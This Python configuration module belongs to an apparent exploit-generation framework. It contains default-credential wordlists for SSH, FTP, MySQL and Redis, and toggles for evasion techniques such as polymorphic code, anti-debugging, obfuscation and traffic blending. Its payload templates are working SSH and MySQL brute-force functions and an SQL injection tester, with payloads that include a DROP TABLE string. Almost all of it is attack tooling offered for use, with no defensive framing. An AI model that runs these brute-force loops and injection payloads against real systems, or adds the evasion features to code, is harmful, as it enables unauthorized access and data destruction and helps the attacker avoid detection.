#!/usr/bin/env python3
"""
Exploit Configuration Module
Contains configuration values for exploit generation and evasion techniques
"""

from typing import Dict, List, Any
from ..core.config import get_config

config = get_config()

class ExploitConfig:
    """Configuration for exploit generation and evasion
    
    This class centralizes all the configuration for exploit generation.
    I moved all the hardcoded values here to make the code more maintainable.
    It's a bit verbose but it makes everything configurable.
    
    TODO: Some of the default values could be smarter
    TODO: Should probably add validation for the config values
    TODO: The service configs could be more comprehensive
    """
    
    # Exploit generation settings
    EXPLOIT_SETTINGS = {
        'max_exploit_size': 50000,  # Maximum exploit file size in bytes
        'default_timeout': 30,  # Default timeout for network operations
        'max_retries': 3,  # Maximum retry attempts for failed operations
        'enable_evasion': True,  # Enable evasion techniques
        'enable_polymorphism': True,  # Enable polymorphic code generation
        'enable_anti_debug': True,  # Enable anti-debugging techniques
        'enable_stealth': True,  # Enable stealth techniques
    }
    
    # Service-specific configurations
    SERVICE_CONFIGS = {
        'ssh': {
            'default_port': 22,
            'common_users': ['root', 'admin', 'user', 'test', 'guest'],
            'common_passwords': ['password', '123456', 'admin', 'root', 'test'],
            'timeout': 10,
            'max_attempts': 5
        },
        'ftp': {
            'default_port': 21,
            'common_users': ['admin', 'ftp', 'user', 'test'],
            'common_passwords': ['password', '123456', 'admin', 'ftp', 'test'],
            'timeout': 15,
            'max_attempts': 3
        },
        'http': {
            'default_port': 80,
            'common_paths': ['/', '/admin', '/login', '/wp-admin', '/phpmyadmin'],
            'timeout': 10,
            'max_attempts': 10
        },
        'https': {
            'default_port': 443,
            'common_paths': ['/', '/admin', '/login', '/wp-admin', '/phpmyadmin'],
            'timeout': 10,
            'max_attempts': 10
        },
        'mysql': {
            'default_port': 3306,
            'common_users': ['root', 'admin', 'mysql', 'user', 'test'],
            'common_passwords': ['', 'password', '123456', 'admin', 'root', 'mysql'],
            'timeout': 10,
            'max_attempts': 5
        },
        'redis': {
            'default_port': 6379,
            'common_passwords': ['', 'redis', 'password', '123456', 'admin', 'root'],
            'timeout': 10,
            'max_attempts': 3
        }
    }
    
    # Evasion technique configurations
    EVASION_CONFIGS = {
        'obfuscation': {
            'enable_variable_renaming': True,
            'enable_string_encoding': True,
            'enable_control_flow_obfuscation': True,
            'enable_import_obfuscation': True,
            'encoding_methods': ['base64', 'hex', 'rot13', 'custom']
        },
        'encoding': {
            'enable_compression': True,
            'enable_encryption': True,
            'enable_multiple_layers': True,
            'compression_methods': ['gzip', 'bz2', 'lzma', 'zlib'],
            'encoding_methods': ['base64', 'hex', 'url', 'rot13']
        },
        'anti_debug': {
            'enable_timing_checks': True,
            'enable_process_checks': True,
            'enable_environment_checks': True,
            'enable_debugger_detection': True
        },
        'polymorphism': {
            'enable_code_mutation': True,
            'enable_junk_code_insertion': True,
            'enable_control_flow_modification': True,
            'mutation_probability': 0.3
        },
        'stealth': {
            'enable_legitimate_behavior_mimicry': True,
            'enable_traffic_blending': True,
            'enable_payload_encapsulation': True
        }
    }
    
    # Payload templates
    PAYLOAD_TEMPLATES = {
        'ssh_brute_force': '''
def brute_force_ssh(self, username_list, password_list):
    """Attempt SSH brute force with common credentials"""
    for username in username_list:
        for password in password_list:
            try:
                self.client.connect(
                    self.host, 
                    port=self.port, 
                    username=username, 
                    password=password,
                    timeout=5
                )
                return (username, password)
            except Exception:
                continue
    return None
''',
        'http_sql_injection': '''
def test_sql_injection(self, endpoint):
    """Test for SQL injection vulnerabilities"""
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "' OR 1=1#",
        "admin'--"
    ]
    
    for payload in payloads:
        try:
            test_url = f"{self.base_url}{endpoint}?id={payload}"
            response = self.session.get(test_url, timeout=10)
            
            # Check for SQL error messages
            error_indicators = [
                'sql syntax', 'mysql_fetch', 'ora-', 'sqlite',
                'postgresql', 'microsoft ole db', 'oracle error'
            ]
            
            for indicator in error_indicators:
                if indicator.lower() in response.text.lower():
                    return True
        except Exception:
            continue
    
    return False
''',
        'mysql_brute_force': '''
def brute_force_mysql(self, username_list, password_list):
    """Attempt MySQL brute force"""
    for username in username_list:
        for password in password_list:
            try:
                self.connection = mysql.connector.connect(
                    host=self.host,
                    port=self.port,
                    user=username,
                    password=password,
                    connection_timeout=10
                )
                return (username, password)
            except Exception:
                continue
    return None
'''
    }
    
    # Risk assessment configurations
    RISK_CONFIGS = {
        'high_risk_services': ['ssh', 'ftp', 'telnet', 'rdp', 'smb'],
        'medium_risk_services': ['http', 'https', 'mysql', 'postgresql'],
        'low_risk_services': ['dns', 'ntp', 'smtp', 'pop3'],
        'critical_vulnerabilities': [
            'sql_injection', 'command_injection', 'buffer_overflow',
            'privilege_escalation', 'remote_code_execution'
        ]
    }
    
    # Exploit database configurations
    DATABASE_CONFIGS = {
        'max_exploits_per_service': 100,
        'similarity_threshold': 0.8,
        'uniqueness_threshold': 0.7,
        'auto_save_enabled': True,
        'backup_enabled': True
    }
    
    @classmethod
    def get_exploit_setting(cls, key: str, default: Any = None) -> Any:
        """Get exploit setting with fallback to config file"""
        return cls.EXPLOIT_SETTINGS.get(key, config.get(f'exploit.{key}', default))
    
    @classmethod
    def get_service_config(cls, service: str) -> Dict[str, Any]:
        """Get service-specific configuration"""
        return cls.SERVICE_CONFIGS.get(service.lower(), {})
    
    @classmethod
    def get_evasion_config(cls, technique: str) -> Dict[str, Any]:
        """Get evasion technique configuration"""
        return cls.EVASION_CONFIGS.get(technique, {})
    
    @classmethod
    def get_payload_template(cls, template_name: str) -> str:
        """Get payload template"""
        return cls.PAYLOAD_TEMPLATES.get(template_name, '')
    
    @classmethod
    def is_high_risk_service(cls, service: str) -> bool:
        """Check if service is high risk"""
        return service.lower() in cls.RISK_CONFIGS['high_risk_services']
    
    @classmethod
    def is_critical_vulnerability(cls, vuln_type: str) -> bool:
        """Check if vulnerability is critical"""
        return vuln_type.lower() in cls.RISK_CONFIGS['critical_vulnerabilities']
    
    @classmethod
    def get_database_config(cls, key: str, default: Any = None) -> Any:
        """Get database configuration"""
        return cls.DATABASE_CONFIGS.get(key, default)
